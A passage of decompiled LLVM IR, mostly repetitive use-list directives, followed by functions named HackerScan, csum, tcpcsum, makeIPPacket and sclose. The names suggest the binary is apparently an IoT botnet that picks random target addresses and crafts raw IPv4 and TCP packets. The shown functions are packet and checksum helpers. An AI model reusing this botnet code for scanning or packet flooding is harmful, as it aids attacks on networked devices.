  uselistorder label %dec_label_pc_ed94, { 1, 0 }
  uselistorder label %dec_label_pc_ed60, { 1, 0 }
  uselistorder label %dec_label_pc_ed24, { 1, 0 }
  uselistorder label %dec_label_pc_ece8, { 1, 0 }
  uselistorder label %dec_label_pc_ecac, { 1, 0 }
  uselistorder label %dec_label_pc_ec78, { 1, 0 }
  uselistorder label %dec_label_pc_ec3c, { 1, 0 }
  uselistorder label %dec_label_pc_ec00, { 1, 0 }
  uselistorder label %dec_label_pc_ebc4, { 1, 0 }
  uselistorder label %dec_label_pc_eb90, { 1, 0 }
  uselistorder label %dec_label_pc_eb54, { 1, 0 }
  uselistorder label %dec_label_pc_eb18, { 1, 0 }
  uselistorder label %dec_label_pc_eadc, { 1, 0 }
  uselistorder label %dec_label_pc_eaa8, { 1, 0 }
  uselistorder label %dec_label_pc_ea6c, { 1, 0 }
  uselistorder label %dec_label_pc_ea30, { 1, 0 }
  uselistorder label %dec_label_pc_e9f4, { 1, 0 }
  uselistorder label %dec_label_pc_e9c0, { 1, 0 }
  uselistorder label %dec_label_pc_e984, { 1, 0 }
  uselistorder label %dec_label_pc_e948, { 1, 0 }
  uselistorder label %dec_label_pc_e90c, { 1, 0 }
  uselistorder label %dec_label_pc_e8d8, { 1, 0 }
  uselistorder label %dec_label_pc_e89c, { 1, 0 }
  uselistorder label %dec_label_pc_e860, { 1, 0 }
  uselistorder label %dec_label_pc_e824, { 1, 0 }
  uselistorder label %dec_label_pc_e7f0, { 1, 0 }
  uselistorder label %dec_label_pc_e7b4, { 1, 0 }
  uselistorder label %dec_label_pc_e778, { 1, 0 }
  uselistorder label %dec_label_pc_e73c, { 1, 0 }
  uselistorder label %dec_label_pc_e708, { 1, 0 }
  uselistorder label %dec_label_pc_e6cc, { 1, 0 }
  uselistorder label %dec_label_pc_e690, { 1, 0 }
  uselistorder label %dec_label_pc_e654, { 1, 0 }
  uselistorder label %dec_label_pc_e620, { 1, 0 }
  uselistorder label %dec_label_pc_e5e4, { 1, 0 }
  uselistorder label %dec_label_pc_e5a8, { 1, 0 }
  uselistorder label %dec_label_pc_e56c, { 1, 0 }
  uselistorder label %dec_label_pc_e538, { 1, 0 }
  uselistorder label %dec_label_pc_e4fc, { 1, 0 }
  uselistorder label %dec_label_pc_e4c0, { 1, 0 }
  uselistorder label %dec_label_pc_e484, { 1, 0 }
  uselistorder label %dec_label_pc_e450, { 1, 0 }
  uselistorder label %dec_label_pc_e414, { 1, 0 }
  uselistorder label %dec_label_pc_e3d8, { 1, 0 }
  uselistorder label %dec_label_pc_e39c, { 1, 0 }
  uselistorder label %dec_label_pc_e368, { 1, 0 }
  uselistorder label %dec_label_pc_e32c, { 1, 0 }
  uselistorder label %dec_label_pc_e2f0, { 1, 0 }
  uselistorder label %dec_label_pc_e2b4, { 1, 0 }
  uselistorder label %dec_label_pc_e280, { 1, 0 }
  uselistorder label %dec_label_pc_e24c, { 1, 0 }
  uselistorder label %dec_label_pc_e218, { 1, 0 }
  uselistorder label %dec_label_pc_e1e4, { 1, 0 }
  uselistorder label %dec_label_pc_e1b0, { 1, 0 }
  uselistorder label %dec_label_pc_e17c, { 1, 0 }
  uselistorder label %dec_label_pc_e148, { 1, 0 }
  uselistorder label %dec_label_pc_e114, { 1, 0 }
  uselistorder label %dec_label_pc_e0e0, { 1, 0 }
  uselistorder label %dec_label_pc_e0ac, { 1, 0 }
  uselistorder label %dec_label_pc_e078, { 1, 0 }
  uselistorder label %dec_label_pc_e044, { 1, 0 }
  uselistorder label %dec_label_pc_e010, { 1, 0 }
  uselistorder label %dec_label_pc_dfdc, { 1, 0 }
  uselistorder label %dec_label_pc_dfa8, { 1, 0 }
  uselistorder label %dec_label_pc_df74, { 1, 0 }
  uselistorder label %dec_label_pc_df40, { 1, 0 }
  uselistorder label %dec_label_pc_df0c, { 1, 0 }
  uselistorder label %dec_label_pc_ded8, { 1, 0 }
  uselistorder label %dec_label_pc_dea4, { 1, 0 }
  uselistorder label %dec_label_pc_de70, { 1, 0 }
  uselistorder label %dec_label_pc_de3c, { 1, 0 }
  uselistorder label %dec_label_pc_de08, { 1, 0 }
  uselistorder label %dec_label_pc_ddd4, { 1, 0 }
  uselistorder label %dec_label_pc_dda0, { 1, 0 }
  uselistorder label %dec_label_pc_dd6c, { 1, 0 }
  uselistorder label %dec_label_pc_dd38, { 1, 0 }
  uselistorder label %dec_label_pc_dd04, { 1, 0 }
  uselistorder label %dec_label_pc_dcd0, { 1, 0 }
  uselistorder label %dec_label_pc_dc9c, { 1, 0 }
  uselistorder label %dec_label_pc_d9fc, { 1, 0 }
  uselistorder label %dec_label_pc_d9c8, { 1, 0 }
  uselistorder label %dec_label_pc_d994, { 1, 0 }
  uselistorder label %dec_label_pc_d960, { 1, 0 }
  uselistorder label %dec_label_pc_d92c, { 1, 0 }
  uselistorder label %dec_label_pc_d8f8, { 1, 0 }
  uselistorder label %dec_label_pc_d8c4, { 1, 0 }
  uselistorder label %dec_label_pc_d890, { 1, 0 }
  uselistorder label %dec_label_pc_d85c, { 1, 0 }
  uselistorder label %dec_label_pc_d828, { 1, 0 }
  uselistorder label %dec_label_pc_d7f4, { 1, 0 }
  uselistorder label %dec_label_pc_d7c0, { 1, 0 }
  uselistorder label %dec_label_pc_d78c, { 1, 0 }
  uselistorder label %dec_label_pc_d758, { 1, 0 }
  uselistorder label %dec_label_pc_d724, { 1, 0 }
  uselistorder label %dec_label_pc_d6f0, { 1, 0 }
  uselistorder label %dec_label_pc_d6bc, { 1, 0 }
  uselistorder label %dec_label_pc_d688, { 1, 0 }
  uselistorder label %dec_label_pc_d654, { 1, 0 }
  uselistorder label %dec_label_pc_d620, { 1, 0 }
  uselistorder label %dec_label_pc_d5ec, { 1, 0 }
  uselistorder label %dec_label_pc_d5b8, { 1, 0 }
  uselistorder label %dec_label_pc_d584, { 1, 0 }
  uselistorder label %dec_label_pc_d550, { 1, 0 }
  uselistorder label %dec_label_pc_d51c, { 1, 0 }
  uselistorder label %dec_label_pc_d4e8, { 1, 0 }
  uselistorder label %dec_label_pc_d4b4, { 1, 0 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d44c, { 1, 0 }
  uselistorder label %dec_label_pc_d418, { 1, 0 }
  uselistorder label %dec_label_pc_d3e4, { 1, 0 }
  uselistorder label %dec_label_pc_d3b0, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
  uselistorder label %dec_label_pc_d314, { 1, 0 }
  uselistorder label %dec_label_pc_d2e0, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %dec_label_pc_d210, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
  uselistorder label %dec_label_pc_d1a8, { 1, 0 }
  uselistorder label %dec_label_pc_d174, { 1, 0 }
  uselistorder label %dec_label_pc_d140, { 1, 0 }
  uselistorder label %dec_label_pc_d10c, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %dec_label_pc_d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_d070, { 1, 0 }
  uselistorder label %dec_label_pc_d03c, { 1, 0 }
  uselistorder label %dec_label_pc_d008, { 1, 0 }
  uselistorder label %dec_label_pc_cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa0, { 1, 0 }
  uselistorder label %dec_label_pc_cf6c, { 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
  uselistorder label %dec_label_pc_ced0, { 1, 0 }
  uselistorder label %dec_label_pc_ce9c, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 0 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce00, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0 }
  uselistorder label %dec_label_pc_cd98, { 1, 0 }
  uselistorder label %dec_label_pc_cd64, { 1, 0 }
  uselistorder label %dec_label_pc_cd30, { 1, 0 }
  uselistorder label %dec_label_pc_ccfc, { 1, 0 }
  uselistorder label %dec_label_pc_ccc8, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cc60, { 1, 0 }
  uselistorder label %dec_label_pc_cc2c, { 1, 0 }
  uselistorder label %dec_label_pc_cbf8, { 1, 0 }
  uselistorder label %dec_label_pc_cbc4, { 1, 0 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_cb28, { 1, 0 }
  uselistorder label %dec_label_pc_caf4, { 1, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %dec_label_pc_ca8c, { 1, 0 }
  uselistorder label %dec_label_pc_ca58, { 1, 0 }
  uselistorder label %dec_label_pc_ca24, { 1, 0 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %dec_label_pc_c9bc, { 1, 0 }
  uselistorder label %dec_label_pc_c988, { 1, 0 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
  uselistorder label %dec_label_pc_c8ec, { 1, 0 }
  uselistorder label %dec_label_pc_c8b8, { 1, 0 }
  uselistorder label %dec_label_pc_c884, { 1, 0 }
  uselistorder label %dec_label_pc_c850, { 1, 0 }
  uselistorder label %dec_label_pc_c81c, { 1, 0 }
  uselistorder label %dec_label_pc_c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_c7b4, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %dec_label_pc_c74c, { 1, 0 }
  uselistorder label %dec_label_pc_c718, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c614, { 1, 0 }
  uselistorder label %dec_label_pc_c5e0, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 1, 0 }
  uselistorder label %dec_label_pc_c578, { 1, 0 }
  uselistorder label %dec_label_pc_c544, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c440, { 1, 0 }
  uselistorder label %dec_label_pc_c40c, { 1, 0 }
  uselistorder label %dec_label_pc_c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c308, { 1, 0 }
  uselistorder label %dec_label_pc_c2d4, { 1, 0 }
  uselistorder label %dec_label_pc_c2a0, { 1, 0 }
  uselistorder label %dec_label_pc_c26c, { 1, 0 }
  uselistorder label %dec_label_pc_c238, { 1, 0 }
  uselistorder label %dec_label_pc_c204, { 1, 0 }
  uselistorder label %dec_label_pc_c1d0, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c168, { 1, 0 }
  uselistorder label %dec_label_pc_c134, { 1, 0 }
  uselistorder label %dec_label_pc_c100, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %dec_label_pc_c098, { 1, 0 }
  uselistorder label %dec_label_pc_c064, { 1, 0 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_bffc, { 1, 0 }
  uselistorder label %dec_label_pc_bfc8, { 1, 0 }
  uselistorder label %dec_label_pc_bf94, { 1, 0 }
  uselistorder label %dec_label_pc_bf60, { 1, 0 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_bef8, { 1, 0 }
  uselistorder label %dec_label_pc_bec4, { 1, 0 }
  uselistorder label %dec_label_pc_be90, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_be28, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
  uselistorder label %dec_label_pc_bdc0, { 1, 0 }
  uselistorder label %dec_label_pc_bd8c, { 1, 0 }
  uselistorder label %dec_label_pc_bd58, { 1, 0 }
  uselistorder label %dec_label_pc_bd24, { 1, 0 }
  uselistorder label %dec_label_pc_bcf0, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
  uselistorder label %dec_label_pc_bc88, { 1, 0 }
  uselistorder label %dec_label_pc_bc54, { 1, 0 }
  uselistorder label %dec_label_pc_bc20, { 1, 0 }
  uselistorder label %dec_label_pc_bbec, { 1, 0 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bb84, { 1, 0 }
  uselistorder label %dec_label_pc_bb50, { 1, 0 }
  uselistorder label %dec_label_pc_bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_bae8, { 1, 0 }
  uselistorder label %dec_label_pc_bab4, { 1, 0 }
  uselistorder label %dec_label_pc_ba80, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_b7b0, { 1, 0 }
  uselistorder label %dec_label_pc_b77c, { 1, 0 }
  uselistorder label %dec_label_pc_b748, { 1, 0 }
  uselistorder label %dec_label_pc_b714, { 1, 0 }
  uselistorder label %dec_label_pc_b6e0, { 1, 0 }
  uselistorder label %dec_label_pc_b6ac, { 1, 0 }
  uselistorder label %dec_label_pc_b678, { 1, 0 }
  uselistorder label %dec_label_pc_b644, { 1, 0 }
  uselistorder label %dec_label_pc_b610, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc, { 1, 0 }
  uselistorder label %dec_label_pc_b5a8, { 1, 0 }
  uselistorder label %dec_label_pc_b574, { 1, 0 }
  uselistorder label %dec_label_pc_b540, { 1, 0 }
  uselistorder label %dec_label_pc_b50c, { 1, 0 }
  uselistorder label %dec_label_pc_b4d8, { 1, 0 }
  uselistorder label %dec_label_pc_b4a4, { 1, 0 }
  uselistorder label %dec_label_pc_b470, { 1, 0 }
  uselistorder label %dec_label_pc_b43c, { 1, 0 }
  uselistorder label %dec_label_pc_b408, { 1, 0 }
  uselistorder label %dec_label_pc_b3d4, { 1, 0 }
  uselistorder label %dec_label_pc_b3a0, { 1, 0 }
  uselistorder label %dec_label_pc_b36c, { 1, 0 }
  uselistorder label %dec_label_pc_b338, { 1, 0 }
  uselistorder label %dec_label_pc_b304, { 1, 0 }
  uselistorder label %dec_label_pc_b2d0, { 1, 0 }
  uselistorder label %dec_label_pc_b29c, { 1, 0 }
  uselistorder label %dec_label_pc_b268, { 1, 0 }
  uselistorder label %dec_label_pc_b234, { 1, 0 }
  uselistorder label %dec_label_pc_b200, { 1, 0 }
  uselistorder label %dec_label_pc_b1cc, { 1, 0 }
  uselistorder label %dec_label_pc_b198, { 1, 0 }
  uselistorder label %dec_label_pc_b164, { 1, 0 }
  uselistorder label %dec_label_pc_b130, { 1, 0 }
  uselistorder label %dec_label_pc_b0fc, { 1, 0 }
  uselistorder label %dec_label_pc_b0c8, { 1, 0 }
  uselistorder label %dec_label_pc_b094, { 1, 0 }
  uselistorder label %dec_label_pc_b060, { 1, 0 }
  uselistorder label %dec_label_pc_b02c, { 1, 0 }
  uselistorder label %dec_label_pc_aff8, { 1, 0 }
  uselistorder label %dec_label_pc_afc4, { 1, 0 }
  uselistorder label %dec_label_pc_af90, { 1, 0 }
  uselistorder label %dec_label_pc_af5c, { 1, 0 }
  uselistorder label %dec_label_pc_af28, { 1, 0 }
  uselistorder label %dec_label_pc_aef4, { 1, 0 }
  uselistorder label %dec_label_pc_aec0, { 1, 0 }
  uselistorder label %dec_label_pc_ae8c, { 1, 0 }
  uselistorder label %dec_label_pc_ae58, { 1, 0 }
  uselistorder label %dec_label_pc_ae24, { 1, 0 }
  uselistorder label %dec_label_pc_adf0, { 1, 0 }
  uselistorder label %dec_label_pc_adbc, { 1, 0 }
  uselistorder label %dec_label_pc_ad88, { 1, 0 }
  uselistorder label %dec_label_pc_ad54, { 1, 0 }
  uselistorder label %dec_label_pc_ad20, { 1, 0 }
  uselistorder label %dec_label_pc_acec, { 1, 0 }
  uselistorder label %dec_label_pc_acb8, { 1, 0 }
  uselistorder label %dec_label_pc_ac84, { 1, 0 }
  uselistorder label %dec_label_pc_ac50, { 1, 0 }
  uselistorder label %dec_label_pc_ac1c, { 1, 0 }
  uselistorder label %dec_label_pc_abe8, { 1, 0 }
  uselistorder label %dec_label_pc_abb4, { 1, 0 }
  uselistorder label %dec_label_pc_ab80, { 1, 0 }
  uselistorder label %dec_label_pc_ab4c, { 1, 0 }
  uselistorder label %dec_label_pc_ab18, { 1, 0 }
  uselistorder label %dec_label_pc_aae4, { 1, 0 }
  uselistorder label %dec_label_pc_aab0, { 1, 0 }
  uselistorder label %dec_label_pc_aa7c, { 1, 0 }
  uselistorder label %dec_label_pc_aa48, { 1, 0 }
  uselistorder label %dec_label_pc_aa14, { 1, 0 }
  uselistorder label %dec_label_pc_a9e0, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1d818 = load i32, i32* @global_var_49980.2631, align 4
  %v1_1d820 = call i32 @__GI_ntohl(i32 %v2_1d818)
  %v2_1d82c = and i32 %v1_1d820, %arg1
  %v0_1d834 = call i32 @rand_cmwc()
  %v1_1d840 = sub i32 -1, %arg1
  %v2_1d844 = and i32 %v0_1d834, %v1_1d840
  %v2_1d84c = xor i32 %v2_1d844, %v2_1d82c
  ret i32 %v2_1d84c
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_1d8d89 = icmp sgt i32 %arg2, 1
  br i1 %v8_1d8d89, label %dec_label_pc_1d890, label %dec_label_pc_1d8dc

dec_label_pc_1d890:                               ; preds = %entry, %dec_label_pc_1d890
  %v2_1d8a4 = phi i32 [ %v2_1d8a8, %dec_label_pc_1d890 ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_1d8ac, %dec_label_pc_1d890 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_1d8c8, %dec_label_pc_1d890 ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_1d8c0, %dec_label_pc_1d890 ], [ %arg1, %entry ]
  %v4_1d890 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_1d894 = load i16, i16* %stack_var_-36.010, align 2
  %v3_1d894 = zext i16 %v2_1d894 to i32
  %v2_1d8a8 = add i32 %v3_1d894, %v2_1d8a4
  %v3_1d8a8 = icmp ult i32 %v2_1d8a8, %v2_1d8a4
  %v4_1d8ac = zext i1 %v3_1d8a8 to i32
  %v5_1d8ac = add i32 %v4_1d8ac, %stack_var_-44.012
  %v1_1d8bc = add i32 %v4_1d890, 2
  %v5_1d8c0 = inttoptr i32 %v1_1d8bc to i16*
  %v1_1d8c8 = add nsw i32 %stack_var_-40.011, -2
  %v8_1d8d8 = icmp sgt i32 %v1_1d8c8, 1
  br i1 %v8_1d8d8, label %dec_label_pc_1d890, label %dec_label_pc_1d8d0.dec_label_pc_1d8dc_crit_edge

dec_label_pc_1d8d0.dec_label_pc_1d8dc_crit_edge:  ; preds = %dec_label_pc_1d890
  br label %dec_label_pc_1d8dc

dec_label_pc_1d8dc:                               ; preds = %dec_label_pc_1d8d0.dec_label_pc_1d8dc_crit_edge, %entry
  %v2_1d8fc = phi i32 [ %v2_1d8a8, %dec_label_pc_1d8d0.dec_label_pc_1d8dc_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_1d8c0, %dec_label_pc_1d8d0.dec_label_pc_1d8dc_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_1d8ac, %dec_label_pc_1d8d0.dec_label_pc_1d8dc_crit_edge ], [ 0, %entry ]
  %v7_1d8d4.lcssa.in = phi i32 [ %v1_1d8c8, %dec_label_pc_1d8d0.dec_label_pc_1d8dc_crit_edge ], [ %arg2, %entry ]
  %v7_1d8d4.lcssa = icmp eq i32 %v7_1d8d4.lcssa.in, 1
  br i1 %v7_1d8d4.lcssa, label %dec_label_pc_1d8e8, label %dec_label_pc_1d964.preheader

dec_label_pc_1d8e8:                               ; preds = %dec_label_pc_1d8dc
  %v1_1d8ec = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_1d8ec = load i8, i8* %v1_1d8ec, align 1
  %v3_1d8ec = zext i8 %v2_1d8ec to i32
  %v2_1d900 = add i32 %v3_1d8ec, %v2_1d8fc
  %v3_1d900 = icmp ult i32 %v2_1d900, %v2_1d8fc
  %v4_1d904 = zext i1 %v3_1d900 to i32
  %v5_1d904 = add i32 %v4_1d904, %stack_var_-44.0.lcssa
  br label %dec_label_pc_1d964.preheader

dec_label_pc_1d964.preheader:                     ; preds = %dec_label_pc_1d8e8, %dec_label_pc_1d8dc
  %v3_1d990.ph = phi i32 [ %v2_1d8fc, %dec_label_pc_1d8dc ], [ %v2_1d900, %dec_label_pc_1d8e8 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_1d8dc ], [ %v5_1d904, %dec_label_pc_1d8e8 ]
  %v3_1d96837 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_1d97038 = udiv i32 %v3_1d990.ph, 65536
  %v2_1d97439 = or i32 %v3_1d96837, %v3_1d97038
  %v3_1d97c40 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_1d98441 = or i32 %v2_1d97439, %v3_1d97c40
  %v2_1d98842 = icmp eq i32 %v2_1d98441, 0
  br i1 %v2_1d98842, label %dec_label_pc_1d990, label %dec_label_pc_1d914

dec_label_pc_1d914:                               ; preds = %dec_label_pc_1d964.preheader, %dec_label_pc_1d914
  %v3_1d97c45 = phi i32 [ %v3_1d97c, %dec_label_pc_1d914 ], [ %v3_1d97c40, %dec_label_pc_1d964.preheader ]
  %v2_1d97444 = phi i32 [ %v2_1d974, %dec_label_pc_1d914 ], [ %v2_1d97439, %dec_label_pc_1d964.preheader ]
  %v3_1d99043 = phi i32 [ %v2_1d954, %dec_label_pc_1d914 ], [ %v3_1d990.ph, %dec_label_pc_1d964.preheader ]
  %v2_1d928 = urem i32 %v3_1d99043, 65536
  %v2_1d954 = add i32 %v2_1d97444, %v2_1d928
  %v3_1d954 = icmp ult i32 %v2_1d954, %v2_1d928
  %v4_1d958 = zext i1 %v3_1d954 to i32
  %v5_1d958 = add nuw nsw i32 %v4_1d958, %v3_1d97c45
  %v3_1d968 = mul i32 %v5_1d958, 65536
  %v3_1d970 = udiv i32 %v2_1d954, 65536
  %v2_1d974 = or i32 %v3_1d968, %v3_1d970
  %v3_1d97c = udiv i32 %v5_1d958, 65536
  %v2_1d984 = or i32 %v2_1d974, %v3_1d97c
  %v2_1d988 = icmp eq i32 %v2_1d984, 0
  br i1 %v2_1d988, label %dec_label_pc_1d964.dec_label_pc_1d990_crit_edge, label %dec_label_pc_1d914

dec_label_pc_1d964.dec_label_pc_1d990_crit_edge:  ; preds = %dec_label_pc_1d914
  br label %dec_label_pc_1d990

dec_label_pc_1d990:                               ; preds = %dec_label_pc_1d964.dec_label_pc_1d990_crit_edge, %dec_label_pc_1d964.preheader
  %v3_1d990.lcssa = phi i32 [ %v2_1d954, %dec_label_pc_1d964.dec_label_pc_1d990_crit_edge ], [ %v3_1d990.ph, %dec_label_pc_1d964.preheader ]
  %v1_1d99c = urem i32 %v3_1d990.lcssa, 65536
  %v3_1d9a4 = xor i32 %v1_1d99c, 65535
  ret i32 %v3_1d9a4

; uselistorder directives
  uselistorder i32 %v2_1d974, { 1, 0 }
  uselistorder i32 %v5_1d958, { 1, 0 }
  uselistorder i32 %v2_1d954, { 2, 0, 3, 1 }
  uselistorder i32 %v3_1d97c40, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_1d990.ph, { 2, 1, 0 }
  uselistorder i32 %v2_1d8fc, { 0, 2, 1 }
  uselistorder i32 %v1_1d8c8, { 0, 2, 1 }
  uselistorder i32 %v2_1d8a8, { 0, 2, 1 }
  uselistorder i32 %v2_1d8a4, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1d914, { 1, 0 }
  uselistorder label %dec_label_pc_1d890, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_1d9bc = load i32, i32* @fp, align 4
  store i32 121284, i32* %stack_var_-4, align 4
  %v2_1d9c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1d9c0, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_1d9e0 = add i32 %arg1, 12
  %v2_1d9e0 = inttoptr i32 %v1_1d9e0 to i32*
  %v3_1d9e0 = load i32, i32* %v2_1d9e0, align 4
  store i32 %v3_1d9e0, i32* %stack_var_-44, align 4
  %v1_1da08 = call i32 @__GI_htons(i32 20)
  %v1_1da24 = call i32 @malloc(i32 32)
  %v2_1da30 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1da30, i32* @r3, align 4
  store i32 %v1_1da24, i32* @r0, align 4
  store i32 %v2_1da30, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_1da40 = call i32 @memcpy()
  %v1_1da48 = add i32 %v1_1da24, 12
  store i32 %v1_1da48, i32* @r3, align 4
  store i32 %v1_1da48, i32* @r0, align 4
  %v3_1da50 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1da50, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_1da58 = call i32 @memcpy()
  %v2_1da64 = inttoptr i32 %v1_1da24 to i16*
  %v3_1da64 = call i32 @csum(i16* %v2_1da64, i32 32)
  %sext = mul i32 %v3_1da64, 65536
  %v1_1da68 = sdiv i32 %sext, 65536
  store i32 %v1_1da24, i32* @r0, align 4
  %v0_1da74 = call i32 @free()
  %v4_1da78 = urem i32 %v1_1da68, 65536
  store i32 %v3_1d9bc, i32* @fp, align 4
  ret i32 %v4_1da78

; uselistorder directives
  uselistorder i32 %v1_1da24, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_1da90 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_1dafc = add i32 %tmp3, 1
  %v4_1dafc = inttoptr i32 %v3_1dafc to i8*
  store i8 0, i8* %v4_1dafc, align 1
  %v3_1db00 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_1db00, 20
  %v1_1db1c = trunc i32 %fold to i16
  %v3_1db1c = add i32 %tmp3, 2
  %v4_1db1c = inttoptr i32 %v3_1db1c to i16*
  store i16 %v1_1db1c, i16* %v4_1db1c, align 2
  %v0_1db20 = call i32 @rand_cmwc()
  %v1_1db34 = trunc i32 %v0_1db20 to i16
  %v3_1db34 = add i32 %tmp3, 4
  %v4_1db34 = inttoptr i32 %v3_1db34 to i16*
  store i16 %v1_1db34, i16* %v4_1db34, align 2
  %v3_1db40 = add i32 %tmp3, 6
  %v4_1db40 = inttoptr i32 %v3_1db40 to i16*
  store i16 0, i16* %v4_1db40, align 2
  %v3_1db4c = add i32 %tmp3, 8
  %v4_1db4c = inttoptr i32 %v3_1db4c to i8*
  store i8 -1, i8* %v4_1db4c, align 1
  %v3_1db58 = add i32 %tmp3, 9
  %v4_1db58 = inttoptr i32 %v3_1db58 to i8*
  store i8 %tmp, i8* %v4_1db58, align 1
  %v3_1db64 = add i32 %tmp3, 10
  %v4_1db64 = inttoptr i32 %v3_1db64 to i16*
  store i16 0, i16* %v4_1db64, align 2
  %v2_1db70 = add i32 %tmp3, 12
  %v3_1db70 = inttoptr i32 %v2_1db70 to i32*
  store i32 %arg3, i32* %v3_1db70, align 4
  %v2_1db7c = add i32 %tmp3, 16
  %v3_1db7c = inttoptr i32 %v2_1db7c to i32*
  store i32 %arg2, i32* %v3_1db7c, align 4
  store i32 %v3_1da90, i32* @fp, align 4
  ret i32 %v0_1db20
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_1dba8 = icmp sgt i32 %arg1, 2
  br i1 %v8_1dba8, label %dec_label_pc_1dbb8, label %dec_label_pc_1dbc8

dec_label_pc_1dbb8:                               ; preds = %entry
  %v1_1dbbc = call i32 @__GI___libc_close(i32 %arg1)
  br label %dec_label_pc_1dbc8

dec_label_pc_1dbc8:                               ; preds = %entry, %dec_label_pc_1dbb8
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1dbb8 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_1dbc8, { 1, 0 }
}

